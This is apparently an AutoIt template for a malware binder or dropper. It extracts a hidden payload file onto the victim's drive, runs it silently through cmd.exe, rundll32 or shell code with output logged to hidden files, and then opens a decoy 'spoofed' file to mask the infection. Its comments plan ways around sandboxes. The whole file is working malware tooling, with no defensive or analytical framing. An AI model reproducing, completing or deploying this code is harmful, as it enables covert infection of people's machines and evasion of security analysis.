;Payload Template Version: 0.4.0a

;TODO: * Read return values for a fail safe system
;      * Workround sand boxes
;      * Circumvent Flash drive malwares as they can pose a problem with the directories and execution

;String Format Placeholder values
; 0  - #RequireAdmin pre-processor
; 1  - Payload arguments placeholder (string)
; 2  - Execute through console (bool)
; 3  - Stream console output to a text file (bool)
; 4  - Execute in victims' drive (bool)
; 5  - Wait for payload to finish (bool)
; 6  - Payload name (string)
; 7  - Spoofed File name (string)
; 8  - Hide/Show Payload Window (Macro | @SW_SHOW / @SW_HIDE)
; 9  - Console command execution switch (String | /k or /c)
; 10 - Type of payload (integer | 0 = payload / 2 = dll payload / 3 = shell code)

#NoTrayIcon
{0} 

Global $arguments = "{1}"
Global $cmd = {2}
Global $cmdstream = {3}
Global $execdrive = {4}
Global $waitpayload = {5}
Global $nmpayload = "{6}"
Global $nmspoof = "{7}"
Global $showwin = {8}
Global $conswitch = "{9}"
Global $payloadtype = {10}
Global $drive = StringLeft(@ScriptDir, 3)
Global $spoofarguments, $payloadtarget, $spooftarget

;Initialization

for $i = 1 to $Cmdline[0]
    $spoofarguments &= " " & $Cmdline[$i]
next

payload()

;Payload Function - The payload function of the payload.
Func payload()
    ;Extract the Payload
    $spooftarget = @ScriptDir & "\" & $nmspoof

    If $execdrive Then
        $payloadtarget = @TempDir & "\" & $nmpayload
    Else
        $payloadtarget = @ScriptDir & "\" & $nmpayload
    EndIf

    If FileExists($payloadtarget) = False Then
        FileInstall("$payloadtmp", $payloadtarget, 1)
        FileSetAttrib($payloadtarget, "+S +H +R")
    EndIf

    ;Extract the Spoofed File
    If FileExists($nmspoof) = False Then
        FileInstall("$spooftmp", $nmspoof, 1)
    EndIf

    ;Execute Payload
    Local $executetarget, $prearguments
    Local $dumptarget = @ScriptDir & '\' & ensureRndNm()

    Switch ($payloadtype)
        Case 0 ;File type payload mode
            If $cmd Then
                $executetarget = "cmd.exe"
                If $cmdstream Then
                    $prearguments = $conswitch & ' "' & $payloadtarget & '" ' & $arguments & ' > ' & $dumptarget & '&attrib +H "' & $dumptarget  & '"'
                Else
                    $prearguments = $conswitch & ' "' & $payloadtarget & '" ' & $arguments
                EndIf
            Else
                $executetarget = $payloadtarget
            EndIf
        Case 1 ;DLL type payload mode
            $executetarget = "rundll32.exe"
            $prearguments = $payloadtarget & ', '
        Case 2 ;Shell code
            $executetarget = "cmd.exe"
            $prearguments = "/c " & $arguments
    EndSwitch

    ShellExecute($executetarget, $prearguments, "", "", $showwin)

    ;Execute Spoof
    ShellExecute($spooftarget, $spoofarguments)
EndFunc

;Ensure Random Name Function - Generates a random .madmp file name while ensuring said file doesn't exist
; * format: DAY-MONTH-YEAR-RANDOM.madmp
; * returns: string
Func ensureRndNm()
    Local $tmpname
    Do
        $tmpname = @MDAY & "-" & @MON & "-" & @YEAR & "-" & Random(100, 999, 1) & ".madmp"
    Until FileExists($tmpname) = False
    return $tmpname
EndFunc